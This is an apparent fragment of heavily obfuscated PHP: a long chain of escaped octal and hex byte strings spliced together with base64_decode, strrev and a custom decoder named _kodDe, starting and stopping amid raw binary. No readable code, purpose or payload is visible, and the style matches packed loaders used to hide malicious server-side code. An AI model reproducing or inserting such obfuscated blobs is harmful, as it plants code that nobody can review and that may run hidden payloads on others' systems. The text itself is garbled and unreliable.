t8†,-WD!/QÚ‚,8•G+&Ç´ĞÔ“Dx¼ÌACQõà1')."\126\156\212\242\277\135\311\115\41\364\67\202\176\42\111\64\135\6\317\200\226\144\44\274\42\264\11\377\43\22\32\371\100\122\173\40\147\201\160\164\23\372\27\21\230\115\341\250\273"."\xb2\xf6\x50\x72\x75\x28\x44\x33\xb0\x30\xfc\x8a\xac\x88\xe0\x40\x57\x25\x67\x6d\x58\x39\x1f\x92\x85\xb2\x3e\x54\xad\xaa\xd\x64\x30\xbd\x83\xb3\x1a\x55\xd5\x6f\xf5\x1\xbe\x70\x57\x10\xd\xf5\xd3".base64_decode('muthDwkkgoL6OhCiGheIKr0TEbgLMoh3xWN9vVK8O7AqHO1iMf9MFpoJVSsd4QQaog==')."\x20\x43\x46\xe1\x19\x4d\x8e\x3\xc3\x49\xd8\x22\x99\xeb\x75\xa0\x74\x7\xa2\xec\x28\x22\xb1\xec\xf8\x30\x40\x29\xb3\x73\x95\xb5\xf7\x85\x23\x1d\xb2\x61\x37\xce\x8\x1b\xa\xa1\xea\xb0\xa7\x4c\x67"."\215\143\161\142\342\315\42\170\310\131\230\240\33\213\220\61\140\21\72\0\54\106\206\213\105\210\7\66\26\41\35\145\21\174\72\11\105\131\32\72\34\242\203\35\73\361\345\264\21".strrev('¸J[¬ı	6âSö2E;MSñ:Jh‰CÉtÒ.5&-ì2Â£ì`Dü’“(¸™n')."\341\165\14\61\251\25\256\235\64\354\274\343\53\140\255\207\276\22\46\46\222\322\167\230\71\3\21\4\252\246\44\214\46\33\265\14\20\242\47\52\271\6\51\257\220\340\140\15\103"."\x22\xff\xa5\x51\xe7\x11\x8a\xd3\xa5\x75\xfc\x64\x4\xce\x1e\x3d\xf0\xb\x2d\xda\x9b\xfe\xc\x40\x94\x49\x2b\xc0\x44\xa5\xde\x3\x9b\x2c\x33\x6b\x70\x7a\x9d\x1c\x18\xa8\x9b\x6c\xb4\x20\x3\x1b\x33"."\x88\xd6\xd1\x28\x2b\x65\xf0\x3d\x2f\x9d\xc3\xfe\x46\x54\xbb\xc0\x24\xdf\xe4\x70\x26\x64\xcc\x54\x4e\x2d\xe2\x1d\xf1\x58\x2f\xe5\x40\x94\x70\xa7\x42\x7d\x1d\x28\xf5\x54\xb2\x5d\xf\xac\x55\x30\x1e".strrev('œ¬‰n¶«UR‘VE­aB¦š©ŒÈŞ¥ĞÑÂ¥Ÿz’Ô9õ'."\r".'ibæƒ«Â')."\71\252\310\350\305\316\313\101\12\113\12\224\253\142\315\210\327\2\146\144\352\201\103\71\117\241\34\61\115\12\47\320\206\35\211\220\236\242\44\303\302\214\254\107\341\316\5\60\20"."\x1f\x3e\xa8\xac\x13\x2a\x62\x9\xb4\x22\x9a\x14\x5a\x93\x8c\x7\x30\x90\x70\x9f\x7b\x4c\x45\x7f\x8\x41\xc1\xa7\xa3\x72\x41\xa3\x96\x97\x84\x67\xf3\xad\x3\x21\xc1\x3a\x7\x8b\x48\x99\x47\xcc\x24"."\x2\x6\x91\x2d\x4f\xea\x13\x4f\x21\x92\x2\x3a\xcc\xb2\x1c\x61\x5\x70\xdd\x34\xd6\x1b\xf\xf7\x4\xe2\x6b\x61\xc8\xc4\x19\x0\x56\xa0\x99\x77\xd8\xdf\x8a\x88\x61\xf5\x49\x16\xe0\x51\xd4\x6a\xd9"."\42\234\316\61\247\260\350\74\313\50\54\152\15\54\0\74\363\300\360\120\207\231\52\67\360\145\102\224\6\146\50\353\141\1\346\150\201\30\37\61\21\125\1\221\34\36\23\263\6"._kodDe('KwKrFaa9mkbZlrXRGuQXJhfSXdsMu34LA1gdWzjK4ASfxcleTZh3ZCRS/8NgeZLDrDI=').strrev('ÆºkõîpjIå»+Ú•añ‡50‡ˆÿh©Œ—ÚŞÁV„{„ÜìE+I¡¡ûê').base64_decode('8tTqGi/PJU+haFc4GmrrGQ8nAj0KazjI1rDPwAVQTzimRhBPrMris3AMpLsOD3SqKg==')."\374\207\370\64\241\165\155\227\53\222\163\62\303\44\32\316\75\334\30\202\250\144\43\204\10\10\277\1\134\2\115\322\52\51\134\132\336\256\240\274\313\357\243\141\266\342\24\234\231"."\162\51\213\104\166\325\361\161\267\112\263\14\26\332\326\342\2\227\135\30\163\237\146\120\240\117\262\373\307\205\25\366\101\162\205\123\164\66\17\355\227\171\346\260\110\325\105\157\12"."\xba\x65\xf1\x8b\x5c\x72\xf8\x61\x41\x3b\x27\xdc\x1e\xc8\x6e\x37\x3b\xda\xd9\xc8\x55\x8a\x76\x42\xcf\x83\x38\xbd\x23\x45\x74\xd5\x85\xf1\x98\x30\xd6\x91\x74\xd8\xc9\xad\x88\x98\xe\xea\x1\xcd\x55".base64_decode('EGoK8/5KuQQwIvxs4ksIUecgO8KLTk4YbGdzX+fxRhbNXr1cMMjNy2pxscLTdRkBag==')."\15\260\267\131\372\202\144\1\210\243\60\221\370\152\121\62\270\250\24\121\273\274\262\11\17\232\130\2\224\214\6\230\333\67\32\233\17\152\35\10\171\40\60\4\20\366\133\146\51"."\76\341\326\205\324\211\171\27\257\160\263\220\321\144\23\111\311\53\366\121\362\214\223\251\23\210\227\65\144\237\13\76\341\162\224\343\362\62\76\340\330\164\30\356\303\61\37\234\125"."\245\266\364\362\374\151\356\155\232\216\206\64\314\4\100\203\144\365\51\255\242\21\335\250\245\146\171\134\302\1\11\332\303\74\21\201\303\323\210\71\304\11\7\142\17\301\7\225\203"."\170\204\143\120\326\247\143\23\42\152\320\201\15\276\170\101\352\124\354\233\13\365\111\76\137\47\131\357\65\313\5\41\43\377\140\231\310\162\276\371\203\161\135\154\311\250\30\261\330"."\xfa\xc6\x42\x82\xfe\x91\x2f\x91\x42\x12\xcd\x74\x95\x21\xe8\x48\xad\x4b\x60\xe6\x73\x90\x2c\x70\xc\x11\xea\x68\x4c\xed\x46\x7b\x41\x8c\x71\xc\x86\x95\x74\xd0\x5e\x56\xa\x48\x1\xb9\xdc\xf1\x13"."\x33\x57\x38\x8f\x2d\x22\xf7\xf7\xf4\xe6\x10\x26\x7b\x23\x22\xab\x3c\xc4\xf4\x26\xc0\xb1\x95\xd8\xa9\x3\xf4\x67\x6d\x21\xe3\x45\xd\x7\xac\xcb\xe8\x36\x77\x28\x84\xa9\x19\x33\xf\xc4\x6d\x96\x4c".base64_decode('hguc+o1KLiq1ER0baDFpR5X6CnSlunPQRHwrlYj1xdnVCY5jkZEaDwXX8lsMDu0MrA==')."\x72\x43\xc2\x58\xe4\x17\xe8\xaa\x9\xe6\x82\x28\xc\x27\x27\x3e\x35\x1e\xc3\x12\xbb\x50\xa4\xd3\x55\x20\xd1\xcd\x5d\x8a\x3a\x61\x6a\x24\x1c\x5d\x51\x33\x1\xf1\xd\x3d\x52\x11\xa\xc\x27\x43\x3d"."\156\230\263\206\104\50\20\147\356\152\161\274\75\22\13\112\311\341\130\365\110\160\306\204\3\251\274\217\2\375\307\66\14\154\44\107\226\126\164\162\311\154\302\202\1\257\72\70\253".strrev('¿‘~U¯3ğà<#àù÷æ Å¤÷€«H›bØ	:„d•ÉE\\™¾¥ş'."\r".'qÀéq').base64_decode('Ij/fPMBNdIL6/nG00OUig1mf+9zmUyqzmWIkVcuyi/kwvRVVE2sTfJKcMAcqUmSW9Q==')."\23\134\231\321\337\136\71\53\126\211\251\231\321\201\313\16\253\137\31\344\63\114\261\114\304\172\316\230\351\12\366\66\44\46\107\330\10\43\220\317\121\5\242\344\303\342\360\15\313"."\61\301\226\155\21\155\222\260\13\7\21\57\331\325\35\136\276\42\322\23\215\365\256\214\47\222\175\253\126\257\131\13\56\27\133\31\266\144\25\57\163\26\6\216\104\375\43\132\331".base64_decode('P8JchK/CRwHd8sssFgeiPmIfrcwBGJUQ8FRMNvy1k2ht/kLRbp4kR29ZT5mmPUnqqg==')."\x9e\xaf\xaf\x18\x12\xfb\x7\xac\x41\x8e\x9e\x19\x7d\x4\x82\x42\x7\xcd\x12\x7\x20\xe0\x2e\xbc\xb2\xab\x72\x8c\xad\x32\xc3\x97\x49\xb9\xd8\x0\x0\x88\xd7\x29\x24\x66\x41\x0\xb9\x97\x5e\x1a\x1d"."\x67\x97\x20\xc4\x43\x97\xe4\xe5\xd6\x67\xcd\x86\xc9\x6\x4f\x99\x5d\xd8\x53\x26\xf3\x92\xb9\x81\xf8\x6f\x74\x3b\x7f\xdc\xe0\xd5\x86\x1d\xe9\xc2\xe3\xed\x6\x2f\x3a\x2a\x3a\xe2\x2e\x7\x90\x58\xff"."\200\273\275\305\21\213\307\344\105\101\266\14\256\120\203\67\246\156\327\222\344\100\356\112\42\101\324\16\133\225\71\340\333\273\23\261\310\31\245\237\162\275\40\60\307\234\26\161\117".base64_decode('TaMeRXgCZqJOp4tftiqImxjBSqdl1wGMuBaGheZWYZhrVaQdzAXexzslBS/BP4BPfg==')."\224\326\76\316\264\244\300\310\262\175\74\56\75\62\342\160\333\40\277\142\240\225\112\301\34\356\203\143\251\72\100\151\71\302\110\145\26\353\204\310\272\45\40\315\243\152\246\76\224".strrev('¦Ê–ğ…„¼ÇB°Î†ß±‚¾óopå^Ë5äel[pŒ2êµ4¬ÀŸ‰oÏ¹™AÜ')."\xd0\x10\x23\x20\x7f\x99\x3c\x26\xe3\x19\x5\x3a\xed\x21\xfe\x17\xd5\x26\x36\x65\x7e\xd3\xb2\xfc\xd8\x3d\x1f\xe1\x2c\xb9\xce\x55\x2c\xc1\xee\x37\x9c\x63\x40\x9f\x80\x91\xe\xa2\xe0\x21\x8c\xfb\xc7"."\345\336\163\205\213\135\52\226\246\341\20\367\143\202\30\344\300\20\166\143\141\26\331\43\27\241\261\222\151\351\262\363\346\214\116\232\313\55\272\45\367\307\5\155\14\57\62\246\226".base64_decode('JjlCFiYZzNWw7LUPD7m34PB3P+ZFg+ByL2zp+jBTo5PYZn407uVug90dw8gvVn6Z+w==')."\214\246\167\233\336\232\0\257\244\106\107\361\137\162\273\216\33\7\207\346\34\31\33\166\232\246\77\307\324\352\253\267\54\274\67\243\271\244\257\50\254\320\307\231\147\144\27\71\162"."\x39\x53\x1e\xe8\x1a\xe8\x19\x48\xca\x83\x63\x97\xb5\x6c\x16\x35\x56\xf2\xde\xe9\x68\x8b\xf0\xdd\xc\xb8\x47\x1e\x3e\x60\x43\x30\xb9\xe7\x67\x10\xdc\xcf\xa8\xe9\x38\xba\x8d\x23\x29\x79\x3e\xa5\x6"."\232\256\304\160\100\324\254\120\335\54\125\244\27\174\144\324\300\333\7\177\165\5\37\240\251\103\155\266\53\20\227\327\360\352\100\33\153\74\32\245\142\273\231\201\235\166\143\35\102"."\272\272\326\272\151\15\350\267\261\316\123\207\171\44\22\307\150\207\1\244\35\165\255\323\32\110\240\21\174\217\114\60\123\23\341\223\124\134\14\203\314\147\51\32\105\351\66\143\51"."\131\300\230\74\264\370\133\374\243\100\62\226\156\300\137\24\117\207\270\275\103\217\251\132\141\202\111\351\125\331\3\62\370\126\206\1\226\123\272\171\113\230\157\344\236\16\250\176\215".base64_decode('N9BzjFd4CV68dKyQV+Dw01bf7GuqV9jTMm31fclO74L6pUv2WBwkd5u23oMvJ/HRnA==').strrev('Ì-ïl-ÅÃ,Ô{ut<%‚qö`ÃKà¨ÄBÔmE˜M ­PVMŒïÄx~¼bÃİÀ—I')."\254\45\47\221\231\202\305\326\56\221\203\264\142\161\35\353\176\137\151\274\122\364\342\223\261\67\41\373\223\163\75\206\320\344\314\217\317\266\316\374\62\25\114\13\372\120\20\101\372"."\366\105\253\42\77\210\42\271\305\45\162\23\272\0\231\16\2\300\60\201\144\40\101\54\263\102\201\34\323\74\325\111\363\226\271\332\213\207\332\213\130\7\214\377\150\121\331\206\344"."\xd3\x5a\xce\xe2\x7c\x52\xc3\xfd\xd0\x86\x7b\x14\x48\x11\x3c\xb9\x5e\xf9\x91\x8f\x31\xc4\xe9\xe1\x64\xec\xc1\xde\x8b\xe7\xd7\x6b\x64\x26\x4b\x11\x8b\xba\x66\x53\xd3\x80\x2a\xb5\xb2\xf4\x55\x8c\x8c"."\373\223\344\256\334\133\251\260\17\326\254\124\346\103\131\6\322\211\60\257\117\166\215\216\317\351\136\176\65\340\366\274\56\170\167\255\332\115\74\132\274\112\313\354\326\271\13\133\231"."\211\324\14\166\325\137\51\61\275\135\24\144\156\344\217\362\147\31\35\20\157\154\260\276\341\11\227\34\356\73\300\142\30\371\12\147\4\304\221\117\264\326\361\300\13\164\224\36\35"."\xa5\x87\x1\x88\x40\x97\xae\x24\xac\x0\xa3\xf2\x97\x14\x6a\x50\xd2\xc\xb3\xde\x33\xd8\x83\x16\xd2\xd3\x72\x7c\x42\x86\x58\xa0\xcc\xf3\x6b\x62\x89\xa4\xf2\xc3\xa2\x27\x29\xac\xa2\xc\x18\x3e\x8c"."\x1a\x6a\xa\xe\x8c\xec\xa9\xb2\xb4\x34\x57\x29\xe\xb7\x49\x89\x8a\x6d\x9a\x4a\x41\x2b\x8e\x3\x83\x3b\xdd\x6a\x9d\x6e\x2d\xc2\x1f\x6a\xc3\xca\xd9\xd6\x74\xf6\xe2\x85\x70\xaa\x8a\xf7\x11\xe1\x2e"."\217\372\175\201\24\52\276\366\341\127\137\174\170\223\212\127\40\127\57\171\53\4\66\45\372\156\10\44\104\372\272\302\121\111\117\107\2\250\301\216\250\32\350\355\255\231\300\71\22".base64_decode('LLfCl9y+9dIrYEBBjcKQksba/m11GFqnWOU0cy1b5wc6SjIIQepiA4rU4yJKFqGJlw==')."\204\150\162\375\222\305\176\3\112\372\374\107\343\163\200\37\53\274\24\147\340\111\224\357\337\11\264\123\270\316\121\224\305\232\102\207\253\255\236\110\141\353\225\34\332\166\271\266\337"."\22\167\341\50\273\4\131\354\327\344\104\274\200\342\46\143\204\71\373\77\302\35\302\325\24\244\7\44\177\323\344\141\211\240\126\134\125\135\4\127\356\113\313\111\375\324\116\143\120"."\x9e\x3e\x62\x63\x51\x5d\xda\x4f\x8e\x9d\x7e\x71\xee\x51\xe9\xeb\x66\xb5\xaf\x21\xb8\xd4\xbe\x6\x62\xe0\xfb\x6f\x84\xd7\xec\xe2\x51\x4b\xf\x63\xcc\x12\xdb\x0\x34\x3\x12\x7a\xf1\x29\x86\x26\x38"."\34\355\333\222\106\102\5\233\40\21\31\160\131\74\167\263\161\43\255\10\357\374\307\35\127\15\3\245\106\167\122\240\144\270\101\30\203\334\60\174\232\24\60\264\237\71\77\103\261"."\127\316\44\40\54\17\375\25\145\42\321\56\21\241\247\20\107\142\77\323\37\46\261\201\376\172\337\314\343\216\363\33\114\365\207\251\51\260\262\76\236\233\306\7\174\316\374\250\47"."\x30\xf4\x3c\x23\x0\xdc\x39\x29\x1f\xb9\x1c\x16\xe1\x1e\xfe\x99\xc2\x6c\x8a\xab\xf8\x28\x58\xef\xa7\xad\x6d\x49\x3f\xbf\xe1\x18\x64\x69\x2a\x39\x2\xca\x73\xc7\xd8\x43\xa3\x79\x1\x43\x8a\x89\x9c".base64_decode('N7maB4NRwQDzdUEpjY+IAwJO57VLxUNAsjEDDQdKJTnqZxEsEM8bKT+nA1RI7ksL+w==').base64_decode('I5aFUCEXHGvsuBLwg6QEPILIJOLH1rvhqC4O5IHFVrpslGwHBaNvQNaRt2fWayMazQ==')."\122\247\300\241\276\255\216\170\146\257\103\24\213\246\60\262\305\233\262\30\323\54\245\254\347\333\352\110\163\255\234\256\243\362\204\52\325\372\10\52\130\247\60\272\131\320\370\210\225"."\155\23\155\211\334\246\5\136\302\352\213\203\55\100\40\12\227\20\107\37\113\177\247\35\315\160\206\74\331\226\327\313\124\323\231\120\50\162\375\225\305\302\32\232\11\136\344\352\215"."\307\222\261\40\173\266\307\51\325\241\260\71\214\245\265\250\315\226\70\372\60\173\25\256\20\300\162\160\46\301\17\20\230\367\162\245\130\344\272\125\30\63\371\116\326\126\373\117\77"."\x39\x1b\xeb\x99\xc1\x49\xd2\x95\x7e\x8d\xdd\xa2\x0\x1d\xa5\xd7\x42\x89\x5c\xc5\x16\x9b\x29\x76\xfd\x9e\xc4\x76\xac\x16\x80\x25\x1f\x7a\xd8\x83\x9f\x9e\xf1\xf5\x53\x6b\xda\xb6\x26\x66\xad\xc0\x34"."\xb9\x84\x1d\x13\xcb\x29\xa7\x28\x78\x13\x18\xe4\xa3\x8e\x56\xba\x1f\x8\xa5\x58\x43\xf5\x58\xf0\xf\xaf\x96\xd4\x7b\xea\x1b\x7c\x33\x1b\xeb\xab\x53\xa8\xce\x9c\x33\x1d\x2b\xb0\xa8\xcb\x13\x28\x11"."\xde\x8\x81\xcd\x9c\x58\x5\x5\x23\xe1\x50\x34\xa9\x86\x61\x1f\x6f\x6e\x99\xef\x6b\x12\xa6\x3a\x86\x25\xdc\x5e\xd2\x70\x90\x6b\xe\xa0\xc3\x30\x1e\x55\x9f\xa3\x5b\x35\x86\x86\xa\x60\x93\x5c\x1"."\x4c\x2f\x3a\xc4\x44\x74\x48\xf3\x26\xf3\x96\xd8\xd2\xd4\xd4\xe4\x6d\x6a\x46\xff\x33\x15\x66\xe6\xa3\xad\x95\xb9\x30\x90\xb2\x34\x35\xb5\x92\xff\x69\x2\x91\x8a\x2\xa\x3a\x53\x10\xf1\x63\x54\x1b".base64_decode('MozqOjQIdsmCUawwtrI/iI2uFNw0mBahwIawjzgxZATU8WyZQm4BIaa7B4FfrwI+Mw==')."\301\41\165\100\313\66\105\324\220\41\62\50\320\136\156\323\207\262\211\125\263\210\232\123\266\361\106\205\212\231\176\371\143\76\66\270\24\50\134\61\173\131\202\127\176\16\1\12\321".base64_decode('rVFcIDiahso4vSNiCOJh0ryfGCAJhTCrKnl8xFH5noAkc8M4Estz230cjfKa6Ksb9A==').strrev('¼fäl>Ğb•'."\0".'ĞšAs²‘÷l®<Eã$f†F<åÑÁ‚ªg0«ÃgÕ')."\xaa\x54\x54\x1e\xdb\x45\x38\x23\xeb\x49\xd2\x59\x12\x57\x84\xe8\x57\x80\xbf\x3d\x42\x55\xc\x59\xdb\x14\xa0\x28\x34\x4a\x1c\x33\x93\x87\x11\xa9\x56\x68\xeb\x1e\x55\x93\x6b\xbb\x27\x96\xcc\x91\x43"."\342\352\126\354\141\61\151\246\230\30\74\361\15\272\67\14\22\142\0\52\300\17\162\327\210\122\5\356\44\127\231\0\225\236\127\25\0\170\165\156\162\311\120\43\67\206\273\162\23"."\47\210\101\356\353\125\366\214\110\257\364\45\65\22\13\134\322\213\73\174\126\307\210\164\236\364\225\312\346\20\232\165\113\36\64\4\357\255\15\346\331\253\163\326\310\304\133\57\347"."\223\201\370\72\203\275\140\12\350\54\154\201\65\361\200\262\224\125\130\225\112\100\347\152\226\22\202\374\211\40\31\210\317\247\262\326\6\71\77\70\353\300\7\137\47\204\267\354\153"."\220\216\11\54\154\170\355\126\326\64\244\331\4\105\302\302\44\131\246\255\72\320\204\341\52\123\22\301\43\44\156\145\235\160\12\243\42\5\307\35\121\222\20\272\274\316\36\337\5"."\x52\x48\x16\x15\xae\x20\xc2\x1e\x91\x4c\x38\x1c\x9\x3\x9a\xb6\x32\x5e\x44\x2e\xe6\x4c\x7b\xf3\xb4\x1f\xb1\xc0\x5\x2c\x17\x1e\x56\x2e\x11\x95\xef\x2\xf0\x90\xaa\xb2\xb4\x7\xaf\xe8\x6e\xfe\xa0"."\153\15\104\164\42\133\25\126\221\175\33\127\320\312\111\241\24\303\265\263\153\30\164\36\266\250\140\322\203\301\12\175\345\124\51\352\334\2\333\71\251\162\1\170\250\307\104\334\43"._kodDe('Mp/iAxZhrqXhwDTz9tAxkVkHmEA/kj9G53UsJlq+39U7pJ3hXqMvPefyo4292DIcEg0=')."\375\224\32\263\72\161\223\41\224\141\363\243\70\167\127\151\257\120\344\212\320\256\233\314\141\101\315\240\102\232\271\210\170\165\257\221\212\255\335\331\327\270\317\131\240\374\50\217\151"."\xf3\x83\x30\xae\x1e\xa1\xb2\x88\x44\x64\xfe\x36\x49\x8b\x78\x97\x88\xa6\x3a\xee\x17\x25\x7f\xd7\x3c\x2b\x6a\x6\x6b\xbc\xc6\xda\x46\x14\xc6\x88\x57\x70\xe9\x6c\xee\x8a\xba\xd5\xeb\x70\x9\x89\xa3".base64_decode('QVFp5yX7vs22buY0XKilkaAgwG9echoLnCrwKCFpM9VoH9TK68QtKAqtOGBgynraLA==')."\x67\xf0\x86\x28\x39\x91\x28\xda\x71\x7d\x48\x8e\x46\x4c\x2e\xf1\xc2\x97\x86\xb5\xaa\xc0\x7e\x7b\x24\xb2\x83\x57\x61\x20\x6d\x57\x64\x2f\x40\x92\xd3\x72\x14\x93\x7c\xd0\x4b\x8c\xa8\xb7\x59\xe1\x1c"."\xac\x4a\x6b\xa6\x91\x59\x52\x2\xc9\x5f\x8b\x99\x75\xc9\x5d\x25\xd3\x11\x22\x83\x4a\x54\x52\xfc\xa6\xcb\xc5\x62\x32\x6b\x14\x45\xe6\xe0\x98\x79\x9\xae\x80\x38\x64\xc1\x3d\xb0\xe4\x34\x54\x2d\x76"."\26\54\172\46\27\41\337\254\52\102\323\60\23\45\334\232\310\51\26\166\56\337\307\146\261\126\112\215\117\221\44\151\104\323\334\321\23\214\216\30\44\110\30\327\231\76\247\267\271"."\305\313\74\205\311\246\52\354\160\6\373\10\132\130\22\32\340\343\55\43\143\240\15\11\371\104\36\123\272\57\44\256\116\204\123\7\342\325\205\317\47\161\377\302\143\145\211\227\320"."\xb9\xa6\x24\xf1\x83\x22\x93\x75\xa1\xbe\x40\x15\x28\x71\x86\xbe\x5a\xe9\x74\x84\x70\x72\x87\x43\xe5\xd5\x95\x1\xad\xf\x67\x3a\xf8\x9f\x17\x8d\xa1\xae\x58\x4c\x87\x26\x92\xab\x12\x78\xcb\x40\xf6"."\xb0\x4f\x4a\x89\x7e\x8\xbd\x5f\x4\x32\xa9\x97\x7b\x69\x60\x84\x1a\x6\xf5\x10\xc3\x14\x98\x39\x91\x13\xe0\xa4\xc9\x81\xd5\xaa\x1c\x18\x2b\xa1\x4a\x6a\xc4\xb\x27\xde\x86\x46\x6c\xc4\xeb\x90\x2b".base64_decode('9oxzU0usDYU3aa7oaskRlsqR03JEqPaXozQH8VyjzJUgP6n3dvf6OaidL08qKBGOqQ==')."\202\114\305\112\37\323\341\200\67\132\60\322\112\44\326\25\16\6\42\35\341\304\12\145\110\267\25\241\163\102\336\242\160\56\145\42\17\246\3\317\260\72\305\37\114\300\101\157\12".base64_decode('nRi8GX6qssT5SXr6W3pSylktxT+9XFVjEZvZ5KvKYCl3jdx5IdOVMpfKenX+cR0rPQ==').base64_decode('SS2WClRqtAby1/4CecxCzo0YIb04WeON4ohhGWLhsxLjcu2Bjp5wVA1EIrHVDl1BIQ==')."\xdf\x2f\x73\x91\x49\x46\x7e\x58\x44\x9a\x19\x31\x9\xf4\xeb\xd5\xfe\xd2\xc0\xdb\x94\xec\xcd\xdd\x25\x46\xa1\xd3\x27\xbb\xce\x2b\xb1\x4b\x29\x78\xfe\x90\xbf\x40\x40\xa3\xd2\x33\x40\xa5\xb2\x66\x58"."\272\4\240\157\324\314\4\253\26\55\237\167\74\352\227\317\112\321\212\163\147\255\371\51\225\176\200\301\44\67\175\265\62\304\303\135\335\311\377\161\123\215\214\160\221\145\144\230\362".base64_decode('CzdCpI8TBOUHINk3q546+sZHkzziGk8ljoPY62wmOQ4Br05h4ZhKxNqq+ATiTsrjJQ==')."\xf9\x1e\xd5\x9f\xf1\xf3\x21\xa6\x1\xec\x9\x30\xc4\x2e\xef\x70\x44\x1c\x4c\x70\x76\xa8\xd\x7f\x8e\x1e\x57\xd1\x29\x1c\x4b\xc\xd9\x11\x86\x49\xdf\x10\x9d\x80\x71\x76\xe8\x11\xb8\x9e\x7f\x72\x6b".base64_decode('yjoed6r6Bnl2gKaRSyaUc1B0DsX4MyOiqDulRgNQsiJkWjyD0qY00ZfI+BMSymJmUg==')."\55\76\100\374\165\205\12\45\333\161\224\357\226\325\345\245\271\241\0\302\351\210\243\32\126\346\62\13\343\125\0\207\40\53\302\332\305\25\33\361\3\32\305\254\51\217\37\41\310".base64_decode('2PaBvhhIZQYedHTQ7erXhmjx/5OCNDEhOWh0VlLdIMu91Qm2Cz+klDNHnc8IYoj76Q==')."\x24\xc7\xa3\x49\xd2\xa2\x21\x96\xbf\xf2\x33\x4f\xce\x42\x9e\xaa\x87\x4c\x14\xf2\x2\xac\x82\x50\x1d\x66\x11\xbb\x8b\x62\x67\x52\x92\x59\xfa\xf4\x74\xfa\x33\x0\xbf\x6c\x3b\x73\x37\x82\x12\x2a\xf8".base64_decode('ZCNHqmDOyGfKXGVJAHp0ISggpbDWjsZeuiVPrHUwmgxvp9R6Twv74XM+ASNe1hF7pw==')."\xf3\xa5\x11\x7e\xf1\x6e\x89\xc5\x60\xd9\x8e\xb7\x6d\x92\x66\x52\x1b\xf2\x50\x8e\xc\x53\x35\x11\x6b\x1f\x97\xc3\xb2\xb2\x2d\xe9\x5\x4a\x64\xc2\xbc\xc\x9f\xef\x25\x52\x6\xf6\x46\x5d\xc6\x43\x9e"."\114\243\244\316\375\70\213\264\322\70\375\224\113\17\345\315\224\226\217\123\245\76\207\245\114\31\235\246\164\266\7\70\262\121\220\137\53\225\304\325\205\274\145\242\177\35\26\212\220".base64_decode('1pfsVomdvUo1CRIC56SLQwqES8RKMUyvUBzQsnTOk12b0msVYRMH2VE7e+mNKQyYXA==')."\x25\xbb\xc5\xe6\x22\xf1\x4e\xe9\x45\x74\x7f\xf5\xad\x37\x56\x57\x4\x8a\x42\x5e\x5a\x16\x5a\x1f\xc4\x6\x5e\x3e\x88\x41\x6\x65\xb1\x22\x50\xc3\xb1\x90\x31\x2a\x21\x6e\x98\x3e\x4a\x47\x28\x85\xcc"."\270\177\15\124\172\70\10\36\277\253\365\16\20\305\174\362\323\241\147\371\241\6\307\305\346\56\373\12\21\112\60\356\167\351\252\337\330\143\357\351\261\245\3\217\351\325\170\41\157"."\322\7\366\74\302\374\361\353\236\27\22\106\172\316\7\224\161\77\70\153\300\317\15\125\107\17\367\251\203\17\253\253\100\334\75\310\111\263\132\76\54\364\2\34\317\377\111\275\6"."\xd2\x56\xfd\x84\xa0\x34\xc\x52\xbf\x2b\xe5\xbc\x87\xa8\x48\x78\x98\xaf\xbd\x9a\xaf\x10\x3a\x1e\x3b\x72\x4f\x68\x8d\x77\xc\xbf\xb1\x42\xd0\xa5\x26\x87\xae\x8c\x93\xea\xb5\x2e\x4e\x95\xd9\xd\xb3"."\x3b\x9b\xe1\xc0\x5d\xb5\xac\xb\x3\x1e\xea\xc2\xb4\x6a\x83\x58\x5b\xc8\xb4\xcc\x9e\xbb\x50\x16\x6e\x88\x29\x14\xf7\xae\xe0\xa1\x0\xae\x8f\x81\x5b\x11\x48\xa1\x38\xd1\x50\x61\x7e\x53\xe5\xd5\x4f".base64_decode('Ep1q8dUPYLp2gP/ZghGnB5pVUjqvfiq4agQInko6WtKG6FLGMbF+jCVWHd0CxUOXzg==')."\157\121\366\241\106\77\244\175\117\54\26\372\150\241\231\307\147\354\2\226\335\333\145\315\171\240\254\165\156\42\43\301\16\151\6\171\360\133\167\267\235\14\14\110\123\104\262\164\260"."\x92\x6b\xb4\x4d\xb7\x28\x8\x17\xc7\xfb\x22\x11\x6b\xc6\x8a\x79\xd8\xb6\xb1\xc1\xb7\x58\x6d\x12\x25\xfa\x1f\x4c\x20\x3b\x23\xd1\xe3\x94\xd0\xd3\xc2\xdd\x77\x1c\xad\x9d\xa3\xe0\x5f\xc6\xc8\x4c\x8d"."\x7\x2a\x25\x2d\x96\xaf\xe9\x3\xe5\xf4\xf8\xd9\xd0\xab\xd9\x5e\x9\x39\x25\x51\xa2\x6e\xc7\xc8\x64\x3\xb9\x10\x47\x58\x67\xbf\x5d\xd5\xa3\x62\xa2\x8e\x41\x8f\x32\x59\xa6\x6a\x76\x4f\x7a\xc7\x52"."\270\7\223\30\75\134\232\131\204\116\42\1\40\6\211\116\226\111\176\177\217\30\365\11\157\30\144\351\72\226\261\344\246\130\66\212\43\25\311\353\243\272\152\351\65\103\41\41\42"."\x22\x25\xe8\x11\x2c\x6e\xa2\xec\x40\x9a\x19\xe8\xe2\xb6\x94\x9a\xa4\x74\xe7\x14\x5b\xe1\xa1\x96\xde\xa0\x35\xe5\xb0\x98\x2\xbc\x5\xc4\x98\xc3\x57\xf4\x75\xc7\xb1\x13\xc5\x3b\x5c\xaf\x15\x13\x72"."\345\176\302\230\15\21\241\21\202\374\111\46\271\216\63\16\177\317\315\161\346\261\334\217\72\42\316\117\166\340\214\242\356\347\156\201\116\22\273\33\372\65\151\247\25\233\252\10\105"."\53\5\21\221\144\275\344\170\305\23\35\226\313\330\347\225\213\44\60\173\150\313\365\244\53\165\247\113\303\354\24\360\177\375\236\341\377\253\147\14\347\66\61\251\274\343\225\343\56".strrev(''."\r".'òd·ª—§ÚÜö—Ÿ-1›±¦‡sïÌÚšç·¼ş"ÀTé»œ?Wa¦ï¹!7ûÅà')."\363\207\111\153\105\334\166\175\356\167\145\373\331\23\354\344\311\330\301\132\31\5\31\342\207\244\32\170\114\101\214\67\226\36\27\67\322\303\65\256\265\211\246\252\323\375\265\304\213"."\124\145\23\155\100\54\13\163\50\347\147\241\64\76\35\22\57\17\60\172\262\101\156\254\304\316\221\215\100\364\7\227\61\342\104\254\377\201\106\311\164\311\1\252\242\146\111\307\234"."\x38\x80\xf2\x70\xc3\x1c\x62\x93\x66\x36\x9d\x8e\x12\x3d\xae\xf7\x33\x69\x26\x4b\x1e\x5b\x87\x24\xbf\x5a\xcb\xa1\xba\x34\xa7\x3\x72\x11\xac\x20\xef\x14\x6e\xf1\xa7\xcf\x9b\xdc\x6f\xa1\x37\x7b\x5d"."\xd5\xf1\x27\x44\x9d\xb8\xee\x78\xd3\x92\x6a\x86\